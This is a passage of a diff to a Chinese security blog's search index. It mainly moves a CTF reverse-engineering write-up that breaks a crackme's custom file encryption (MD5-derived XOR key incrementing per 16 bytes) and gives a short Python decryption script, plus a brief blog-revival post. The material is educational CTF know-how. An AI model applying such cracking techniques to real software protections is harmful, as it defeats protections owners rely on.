-<p>再接着读取了0x10个字节。它用来验证输入的密码是否正确。然后读取了4个字节，它决定了解密数据部分的长度。最后就是根据这个数据长度读取指定的字节数。</p>
-<p><img src="http://p1.bpimg.com/567571/fbd00866b10d1c81.png" alt=""></p>
-<p>整个加密文件有0x61C9个字节。所以真正的数据部分长度不会超过这个大小。观察加密文件头部，很容易找到数据部分的长度。</p>
-<p><img src="http://p1.bqimg.com/567571/d161617008852e03.png" alt=""></p>
-<p>整个文件0x619C个字节都是加密数据，前面的是头部。</p>
-<p>接下来就是解密，输入的密钥经过md5加密得到的16字节作为密钥对数据进行异或，每异或16字节，密钥就自增1，数据段里有部分数据是如下：</p>
-<p><img src="http://i1.piimg.com/567571/9eba76040404226a.png" alt=""><br>规律很明显，由此可以推断这一部分对应的明文是0x00,数据是从43 C9 FD开始加密，很容易推出加密的密钥是0x13,0x82,0xFE,0x47,0xe4,0xb9,0x8e,0xd8,0x68,0xfc,0xa1,0xd5,0x4a,0x4f,0x36,0x2</p>
-<p>解密脚本如下:</p>
-<pre><code>a=&apos;17 86 02 4B E8 BD 92 DC 6C 00 A5 D9 4E 53 3A 06&apos;
-aList=a.split(&apos; &apos;)
-oriList=[]
-for i in aList:
-    oriList.append((int(i,16)-4)&amp;0xff)
-print(oriList)
-f=open(&apos;1.ctf&apos;,&apos;rb&apos;)
-ctfdata=f.read()
-f.close()
-
-f=open(&apos;encrypt.ctf&apos;,&apos;wb&apos;)
-validData=ctfdata[0x2d:]
-for i in range(0,len(validData)):
-    data=int(validData[i].encode(&apos;hex&apos;),16)
-    tmp=data^oriList[i%16]
-    f.write(chr(tmp))
-    oriList[i%16]+=1
-    oriList[i%16]=oriList[i%16]&amp;0xff
-f.close()
-</code></pre>]]></content>
-      <tags>
-        <tag>writeup</tag>
-        <tag>reverse</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>reverse之第十更</title>
     <url>/2017/02/05/reverse%E4%B9%8B%E7%AC%AC%E5%8D%81%E6%9B%B4/</url>
     <content><![CDATA[<p>一道比较复杂的算法Crack，主要考查CRC校验算法，AES加密，以及base64加密算法。<br><a id="more"></a><br>程序运行之后发现提示内容是Try angin！但是搜索字符串并没有，但是看到一个很像base64的字符串，过去发现各种算法以及调用，在函数开头下断，果然加密算法都在这个地方。</p>
@@ -2829,6 +2610,44 @@ def crack():
                                 return
 if __name__==&apos;__main__&apos;:
     crack()
+</code></pre>]]></content>
+      <tags>
+        <tag>writeup</tag>
+        <tag>reverse</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>reverse之第四更</title>
+    <url>/2017/01/20/reverse%E4%B9%8B%E7%AC%AC%E5%9B%9B%E6%9B%B4/</url>
+    <content><![CDATA[<p>首先读取文件的头四个字节判断是否是0x33465443，不是提示“你打开的不是.ctf加密文件”。<br><a id="more"></a></p>
+<p><img src="http://p1.bqimg.com/567571/a39714c92cd59c03.png" alt=""></p>
+<p>再接着读取了0x10个字节。它用来验证输入的密码是否正确。然后读取了4个字节，它决定了解密数据部分的长度。最后就是根据这个数据长度读取指定的字节数。</p>
+<p><img src="http://p1.bpimg.com/567571/fbd00866b10d1c81.png" alt=""></p>
+<p>整个加密文件有0x61C9个字节。所以真正的数据部分长度不会超过这个大小。观察加密文件头部，很容易找到数据部分的长度。</p>
+<p><img src="http://p1.bqimg.com/567571/d161617008852e03.png" alt=""></p>
+<p>整个文件0x619C个字节都是加密数据，前面的是头部。</p>
+<p>接下来就是解密，输入的密钥经过md5加密得到的16字节作为密钥对数据进行异或，每异或16字节，密钥就自增1，数据段里有部分数据是如下：</p>
+<p><img src="http://i1.piimg.com/567571/9eba76040404226a.png" alt=""><br>规律很明显，由此可以推断这一部分对应的明文是0x00,数据是从43 C9 FD开始加密，很容易推出加密的密钥是0x13,0x82,0xFE,0x47,0xe4,0xb9,0x8e,0xd8,0x68,0xfc,0xa1,0xd5,0x4a,0x4f,0x36,0x2</p>
+<p>解密脚本如下:</p>
+<pre><code>a=&apos;17 86 02 4B E8 BD 92 DC 6C 00 A5 D9 4E 53 3A 06&apos;
+aList=a.split(&apos; &apos;)
+oriList=[]
+for i in aList:
+    oriList.append((int(i,16)-4)&amp;0xff)
+print(oriList)
+f=open(&apos;1.ctf&apos;,&apos;rb&apos;)
+ctfdata=f.read()
+f.close()
+
+f=open(&apos;encrypt.ctf&apos;,&apos;wb&apos;)
+validData=ctfdata[0x2d:]
+for i in range(0,len(validData)):
+    data=int(validData[i].encode(&apos;hex&apos;),16)
+    tmp=data^oriList[i%16]
+    f.write(chr(tmp))
+    oriList[i%16]+=1
+    oriList[i%16]=oriList[i%16]&amp;0xff
+f.close()
 </code></pre>]]></content>
       <tags>
         <tag>writeup</tag>
@@ -3646,13 +3465,6 @@ print flag
       </tags>
   </entry>
   <entry>
-    <title>重出江湖</title>
-    <url>/2020/04/29/%E9%87%8D%E5%87%BA%E6%B1%9F%E6%B9%96/</url>
-    <content><![CDATA[<p>经2017年参加实习之后，由于太忙（懒）blog就荒废了，参加工作以来发现搞技术果然还是得写一写记一记，如今准备重出江湖。<br><a id="more"></a></p>
-<p>今后一段时间的bolg技术重点应该在Android&amp;iOS安全方面，希望能学到更多的技术，也希望能帮到更多走在研究技术路上的小伙伴们。</p>
-]]></content>
-  </entry>
-  <entry>
     <title>程序的动态链接和静态链接</title>
     <url>/2016/08/07/%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%92%8C%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A51/</url>
     <content><![CDATA[<p>参考自：This is an <a href="http://www.xuebuyuan.com/1730287.html" target="_blank" rel="external">http://www.xuebuyuan.com/1730287.html</a><br><a id="more"></a> </p>
@@ -3833,5 +3645,12 @@ void swap(int *a,int *b)
         <tag>动态链接</tag>
         <tag>静态链接</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>重出江湖</title>
+    <url>/2020/04/29/%E9%87%8D%E5%87%BA%E6%B1%9F%E6%B9%96/</url>
+    <content><![CDATA[<p>经2017年参加实习之后，由于太忙（懒）blog就荒废了，参加工作以来发现搞技术果然还是得写一写记一记，如今准备重出江湖。<br><a id="more"></a></p>
+<p>今后一段时间的bolg技术重点应该在Android&amp;iOS安全方面，希望能学到更多的技术，也希望能帮到更多走在研究技术路上的小伙伴们。</p>
+]]></content>
   </entry>
 </search>
